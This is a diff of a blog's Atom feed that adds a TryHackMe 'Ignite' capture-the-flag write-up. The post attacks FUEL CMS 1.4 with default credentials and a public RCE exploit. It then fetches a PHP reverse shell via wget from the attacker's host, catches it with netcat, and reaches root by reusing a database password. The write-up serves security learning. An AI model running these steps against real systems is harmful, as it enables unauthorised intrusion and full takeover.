@@ -1,4 +1,197 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://akymos.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://akymos.io/" rel="alternate" type="text/html" /><updated>2023-05-06T15:23:48+00:00</updated><id>https://akymos.io/feed.xml</id><title type="html">Akymos.io</title><entry><title type="html">TryHackMe - Skynet</title><link href="https://akymos.io/ctf/2023/05/06/skynet.html" rel="alternate" type="text/html" title="TryHackMe - Skynet" /><published>2023-05-06T13:20:00+00:00</published><updated>2023-05-06T13:20:00+00:00</updated><id>https://akymos.io/ctf/2023/05/06/skynet</id><content type="html" xml:base="https://akymos.io/ctf/2023/05/06/skynet.html"><![CDATA[<hr />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://akymos.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://akymos.io/" rel="alternate" type="text/html" /><updated>2023-05-07T16:33:58+00:00</updated><id>https://akymos.io/feed.xml</id><title type="html">Akymos.io</title><entry><title type="html">TryHackMe - Ignite</title><link href="https://akymos.io/ctf/2023/05/07/ignite.html" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-05-07T11:58:00+00:00</published><updated>2023-05-07T11:58:00+00:00</updated><id>https://akymos.io/ctf/2023/05/07/ignite</id><content type="html" xml:base="https://akymos.io/ctf/2023/05/07/ignite.html"><![CDATA[<hr />
+
+<h2>Table of Contents</h2>
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
+      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
+    </ul>
+  </li>
+  <li><a href="#step-0---recon" id="markdown-toc-step-0---recon">Step 0 - Recon</a>    <ul>
+      <li><a href="#nmap" id="markdown-toc-nmap">Nmap</a></li>
+      <li><a href="#gobuster" id="markdown-toc-gobuster">Gobuster</a></li>
+    </ul>
+  </li>
+  <li><a href="#question-1---usertxt" id="markdown-toc-question-1---usertxt">Question 1 - User.txt</a></li>
+  <li><a href="#question-2---roottxt" id="markdown-toc-question-2---roottxt">Question 2 - Root.txt</a></li>
+</ul>
+
+</nav>
+<hr />
+
+<div class="pb-1"></div>
+
+<h2 id="room-info">Room info</h2>
+<ul>
+  <li><strong>Name</strong>: Ignite</li>
+  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/ignite" target="_blank">https://tryhackme.com/room/ignite</a></li>
+  <li><strong>Subscription</strong>: Free</li>
+  <li><strong>Difficulty</strong>: Easy</li>
+  <li><strong>Description</strong>: A new start-up has a few issues with their web server.</li>
+</ul>
+
+<h3 id="questions">Questions</h3>
+<ol>
+  <li>User.txt</li>
+  <li>Root.txt</li>
+</ol>
+
+<h2 id="step-0---recon">Step 0 - Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.178.117 
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-07 12:03 CEST
+Nmap scan report <span class="k">for </span>10.10.178.117 <span class="o">(</span>10.10.178.117<span class="o">)</span>
+Host is up <span class="o">(</span>0.043s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Welcome to FUEL CMS
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.28 seconds
+</code></pre></div></div>
+
+<h3 id="gobuster">Gobuster</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://10.10.178.117 <span class="nt">-q</span>                
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
+/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
+/@                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 1134]
+/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.178.117/assets/]
+/home                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
+/index                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
+/lost+found           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 1134]
+/offline              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 70]
+/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 30]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
+</code></pre></div></div>
+
+<h2 id="question-1---usertxt">Question 1 - User.txt</h2>
+<p>We can see that the website is running on FUEL CMS 1.4. The homepage is a default installation page. We can see that the admin panel is located at <code class="language-plaintext highlighter-rouge">/fuel</code>.
+<img src="/assets/images/ctf-ignite/01.png" alt="Ignite - Fuel index" class="post-image" />
+The default credentials are <code class="language-plaintext highlighter-rouge">admin:admin</code>. We can now login to the admin panel but nothing interesting here. 
+<img src="/assets/images/ctf-ignite/02.png" alt="Ignite - Fuel admin" class="post-image" /></p>
+
+<p>Let’s search for exploits on FUEL CMS 1.4. We can find a RCE exploit
+<a href="https://www.exploit-db.com/exploits/50477" target="_blank">https://www.exploit-db.com/exploits/50477</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python 50477.py <span class="nt">-u</span> http://10.10.178.117
+<span class="o">[</span>+]Connecting...
+Enter Command <span class="nv">$echo</span> <span class="s2">"foo bar"</span> <span class="o">&gt;</span> test.txt  <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-lha</span>
+systemtotal 52K
+drwxrwxrwx 4 root     root     4.0K May  7 03:30 <span class="nb">.</span>
+drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
+<span class="nt">-rw-r--r--</span> 1 root     root      163 Jul 26  2019 .htaccess
+<span class="nt">-rwxrwxrwx</span> 1 root     root     1.4K Jul 26  2019 README.md
+drwxrwxrwx 9 root     root     4.0K Jul 26  2019 assets
+<span class="nt">-rwxrwxrwx</span> 1 root     root      193 Jul 26  2019 composer.json
+<span class="nt">-rwxrwxrwx</span> 1 root     root     6.4K Jul 26  2019 contributing.md
+drwxrwxrwx 9 root     root     4.0K Jul 26  2019 fuel
+<span class="nt">-rwxrwxrwx</span> 1 root     root      12K Jul 26  2019 index.php
+<span class="nt">-rwxrwxrwx</span> 1 root     root       30 Jul 26  2019 robots.txt
+<span class="nt">-rw-r--r--</span> 1 www-data www-data    0 May  7 03:30 test.txt
+
+
+Enter Command <span class="err">$</span>
+</code></pre></div></div>
+<p>Nice, we have can write files on the server.
+<img src="/assets/images/ctf-ignite/03.png" alt="Ignite - Fuel RCE" class="post-image" /></p>
+
+<p>Let’s upload a reverse shell.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter Command <span class="nv">$wget</span> http://10.8.32.129/rs.php <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-lha</span>
+systemtotal 60K
+drwxrwxrwx 4 root     root     4.0K May  7 03:33 <span class="nb">.</span>
+drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
+<span class="nt">-rw-r--r--</span> 1 root     root      163 Jul 26  2019 .htaccess
+<span class="nt">-rwxrwxrwx</span> 1 root     root     1.4K Jul 26  2019 README.md
+drwxrwxrwx 9 root     root     4.0K Jul 26  2019 assets
+<span class="nt">-rwxrwxrwx</span> 1 root     root      193 Jul 26  2019 composer.json
+<span class="nt">-rwxrwxrwx</span> 1 root     root     6.4K Jul 26  2019 contributing.md
+drwxrwxrwx 9 root     root     4.0K Jul 26  2019 fuel
+<span class="nt">-rwxrwxrwx</span> 1 root     root      12K Jul 26  2019 index.php
+<span class="nt">-rwxrwxrwx</span> 1 root     root       30 Jul 26  2019 robots.txt
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 2.6K Apr 16 07:24 rs.php
+<span class="nt">-rw-r--r--</span> 1 www-data www-data    8 May  7 03:31 test.txt
+
+
+Enter Command <span class="err">$</span>
+</code></pre></div></div>
+<p>And we have a shell.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001           
+listening on <span class="o">[</span>any] 9001 ...
+connect to <span class="o">[</span>10.8.32.129] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.178.117] 53586
+Linux ubuntu 4.15.0-45-generic <span class="c">#48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 03:33:37 up 35 min,  0 <span class="nb">users</span>,  load average: 0.02, 0.48, 0.71
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+sh: 0: can<span class="s1">'t access tty; job control turned off
+</span></code></pre></div></div>
+<p>After the stabilisation of the shell, we can find the user flag in the home directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/<span class="nv">$ </span><span class="nb">cd</span> /home/www-data/
+www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span>
+total 12K
+drwx--x--x 2 www-data www-data 4.0K Jul 26  2019 <span class="nb">.</span>
+drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
+<span class="nt">-rw-r--r--</span> 1 root     root       34 Jul 26  2019 flag.txt
+www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+</code></pre></div></div>
+
+<h2 id="question-2---roottxt">Question 2 - Root.txt</h2>
+<p>We can try with LinPEAS to find some interesting information, but nothing useful.
+We can try to find some SUID binaries, but nothing useful.</p>
+
+<p><em>WE ARE STUCK…</em></p>
+
+<p>After a while, I decided to check the installation / configuration of FUEL CMS, maybe we can find something interesting.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html/fuel/application/config<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-30</span> database.php 
+<span class="nv">$active_group</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
+<span class="nv">$query_builder</span> <span class="o">=</span> TRUE<span class="p">;</span>
+
+<span class="nv">$db</span><span class="o">[</span><span class="s1">'default'</span><span class="o">]</span> <span class="o">=</span> array<span class="o">(</span>
+        <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'hostname'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
+        <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'root'</span>,
+        <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'***********'</span>,
+        <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'fuel_schema'</span>,
+        <span class="s1">'dbdriver'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span>,
+        <span class="s1">'dbprefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'pconnect'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="o">(</span>ENVIRONMENT <span class="o">!==</span> <span class="s1">'production'</span><span class="o">)</span>,
+        <span class="s1">'cache_on'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'cachedir'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'char_set'</span> <span class="o">=&gt;</span> <span class="s1">'utf8'</span>,
+        <span class="s1">'dbcollat'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_general_ci'</span>,
+        <span class="s1">'swap_pre'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'encrypt'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'compress'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'stricton'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'failover'</span> <span class="o">=&gt;</span> array<span class="o">()</span>,
+        <span class="s1">'save_queries'</span> <span class="o">=&gt;</span> TRUE
+<span class="o">)</span><span class="p">;</span>
+
+// used <span class="k">for </span>testing purposes
+<span class="k">if</span> <span class="o">(</span>defined<span class="o">(</span><span class="s1">'TESTING'</span><span class="o">))</span>
+<span class="o">{</span>
+        @include<span class="o">(</span>TESTER_PATH.<span class="s1">'config/tester_database'</span>.EXT<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Let’s try to use that password to switch to root.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html/fuel/application/config<span class="nv">$ </span>su       
+Password: 
+root@ubuntu:/var/www/html/fuel/application/config#
+</code></pre></div></div>
+<p><em>IT WORKS!</em></p>
+
+<p>Let’s find the root flag.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/var/www/html/fuel/application/config# <span class="nb">cat</span> /root/
+.bash_history  .cache/        .profile       
+.bashrc        .nano/         root.txt       
+root@ubuntu:/var/www/html/fuel/application/config# <span class="nb">cat</span> /root/root.txt 
+</code></pre></div></div>]]></content><author><name>Akymos</name></author><category term="ctf" /><category term="ctf" /><category term="tryhackme" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.]]></summary></entry><entry><title type="html">TryHackMe - Skynet</title><link href="https://akymos.io/ctf/2023/05/06/skynet.html" rel="alternate" type="text/html" title="TryHackMe - Skynet" /><published>2023-05-06T13:20:00+00:00</published><updated>2023-05-06T13:20:00+00:00</updated><id>https://akymos.io/ctf/2023/05/06/skynet</id><content type="html" xml:base="https://akymos.io/ctf/2023/05/06/skynet.html"><![CDATA[<hr />
 
 <h2>Table of Contents</h2>
 <nav class="toc">
